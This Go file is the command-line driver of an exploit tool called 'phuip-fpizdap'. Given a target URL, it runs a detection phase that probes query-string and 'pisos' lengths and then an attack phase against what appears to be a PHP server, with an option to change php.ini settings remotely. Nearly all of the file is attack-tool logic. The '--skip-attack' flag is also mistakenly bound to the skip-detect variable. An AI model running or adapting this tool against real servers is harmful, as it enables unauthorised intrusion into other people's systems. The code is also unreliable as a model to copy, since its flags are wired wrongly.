package main

import (
	"log"

	"github.com/spf13/cobra"
)

func main() {
	var (
		method       string
		cookie       string
		setting      string
		skipDetect   bool
		skipAttack   bool
		resetSetting bool
		onlyQSL      bool
		params       = &AttackParams{}
	)

	var cmd = &cobra.Command{
		Use:  "phuip-fpizdap [url]",
		Args: cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			url := args[0]
			m, ok := Methods[method]
			if !ok {
				log.Fatalf("Unknown detection method: %v", method)
			}

			requester, err := NewRequester(url, cookie)
			if err != nil {
				log.Fatalf("Failed to create requester: %v", err)
			}

			if resetSetting {
				if !params.Complete() {
					log.Fatal("--reset-setting requires complete params")
				}
				if setting == "" {
					setting = m.PHPOptionDisable
				}
				if err := SetSetting(requester, params, m.PHPOptionDisable, SettingEnableRetries); err != nil {
					log.Fatalf("ResetSetting() returned error: %v", err)
				}
				log.Printf("I did my best trying to set %#v", setting)
				return
			}

			if setting != "" {
				log.Fatal("--setting requires --reset-setting")
			}

			if skipDetect {
				if !params.Complete() {
					log.Fatal("Got --skip-detect and attack params are incomplete, don't know what to do")
				}
				log.Printf("Using attack params %s", params)
			} else {
				var err error
				params, err = Detect(requester, m, params, onlyQSL)
				if err != nil {
					if err == errPisosBruteForbidden && onlyQSL {
						log.Printf("Detect() found QSLs and that's it")
						return
					}
					log.Fatalf("Detect() returned error: %v", err)
				}

				if !params.Complete() {
					log.Fatal("Detect() returned incomplete attack params, something gone wrong")
				}

				log.Printf("Detect() returned attack params: %s <-- REMEMBER THIS", params)
			}

			if skipAttack {
				log.Print("Attack phase is disabled, so that's it")
				return
			}

			if err := Attack(requester, params); err != nil {
				log.Fatalf("Attack returned error: %v", err)
			}
		},
	}
	cmd.Flags().StringVar(&method, "method", "session.auto_start", "detect method (see detect_methods.go)")
	cmd.Flags().StringVar(&cookie, "cookie", "", "send this cookie")
	cmd.Flags().IntVar(&params.QueryStringLength, "qsl", 0, "qsl hint")
	cmd.Flags().IntVar(&params.PisosLength, "pisos", 0, "pisos hint")
	cmd.Flags().BoolVar(&skipDetect, "skip-detect", false, "skip detection phase")
	cmd.Flags().BoolVar(&skipDetect, "skip-attack", false, "skip attack phase")
	cmd.Flags().BoolVar(&onlyQSL, "only-qsl", false, "stop after QSL detection, use this if you just want to check if the server is vulnerable")
	cmd.Flags().BoolVar(&resetSetting, "reset-setting", false, "try to reset setting (requires attack params)")
	cmd.Flags().StringVar(&setting, "setting", "", "specify custom php.ini setting for --reset-setting")

	if err := cmd.Execute(); err != nil {
		log.Fatal(err)
	}
}
